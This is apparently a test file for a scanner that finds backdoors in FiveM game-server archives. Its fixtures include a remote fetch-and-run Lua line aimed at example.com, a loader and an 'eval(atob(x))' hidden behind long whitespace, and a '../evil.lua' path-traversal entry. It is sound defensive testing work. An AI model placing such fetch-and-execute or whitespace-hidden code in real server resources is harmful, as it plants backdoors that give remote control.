import { strToU8, zipSync } from "fflate";
import { describe, expect, it } from "vitest";
import { scanEntries, scanFiles, scanZip } from "../src/index.js";

// Backdoor *shapes* only; none of this is real malware.
const MANIFEST = "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'";
const HIDDEN = `print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end`;
const REMOTE = "PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)";

describe("backdoor scanner", () => {
  it("reads every resource of a server archive and reports full paths", async () => {
    const resources = Object.fromEntries(
      Array.from({ length: 60 }, (_, i) => [
        [`resources/[jobs]/job${i}/fxmanifest.lua`, strToU8(MANIFEST)],
        [`resources/[jobs]/job${i}/server.lua`, strToU8(i === 59 ? HIDDEN : "print('job')")],
      ]).flat(),
    );
    const report = await scanZip(zipSync(resources));
    expect(report.scanned).toBe(120);
    expect(report.findings).toMatchObject([{ code: "LAB-SEC-107", severity: "error", path: "resources/[jobs]/job59/server.lua", line: 2 }]);
  });

  it("checks JS for hidden code, Lua for loaders, and keeps a file that doesn't parse", () => {
    const report = scanFiles({ "web/app.js": `const a = 1;${" ".repeat(600)}eval(atob(x))`, "server.lua": REMOTE, "broken.lua": "function(" });
    expect(report.findings.map((f) => f.code).sort()).toEqual(["LAB-SEC-101", "LAB-SEC-107"]);
    expect(report.unparsed).toEqual(["broken.lua"]);
    // Only server.lua had every check: JavaScript gets the hidden-code check alone.
    expect(report).toMatchObject({ scanned: 1, javascript: ["web/app.js"], notAnalyzed: 2, verdict: "hidden" });
  });

  it("is clean for ordinary code", () => {
    expect(scanFiles({ "server.lua": "RegisterCommand('hi', function() print('hi') end)" }).findings).toEqual([]);
  });

  it("names what it could not read: compiled Lua, escrow, nested archives, executables", async () => {
    const report = await scanZip(
      zipSync({
        "a/fxmanifest.lua": strToU8(MANIFEST),
        "a/server.lua": strToU8("\x1bLua\x54\x00"),
        "b/client.fxap": new Uint8Array([1, 2]),
        "b/client.lua": new Uint8Array([0xff, 0xfe, 0x00]),
        "extras/nested.zip": new Uint8Array([1]),
        "tools/install.bat": strToU8("echo"),
        // Real AppleDouble metadata (magic 0x00051607) is skipped; a `._` name alone is not.
        "__MACOSX/a/._server.lua": new Uint8Array([0, 5, 22, 7, 0, 2, 0, 0]),
      }),
    );
    // Non-UTF-8 bytes are read as Latin-1 (Lua reads bytes): they don't parse, so only the hidden-code check ran.
    expect(report).toMatchObject({ unreadable: ["a/server.lua"], unparsed: ["b/client.lua"], escrowed: ["b/"], archives: ["extras/nested.zip"] });
    expect(report.findings.map((f) => f.code)).toEqual(["LAB-PKG-004"]);
    expect(report.scanned).toBe(1);
  });

  it("reports paths that escape the extraction folder", () => {
    const report = scanEntries(["../evil.lua", "r/server.lua"], { "r/server.lua": "print(1)" }, { unreadable: [], skipped: [] });
    expect(report.findings.map((f) => f.code)).toEqual(["LAB-PKG-005"]);
  });

  it("refuses what isn't a ZIP", async () => {
    await expect(scanZip(strToU8("not a zip"))).rejects.toThrow("invalid_zip");
  });
});
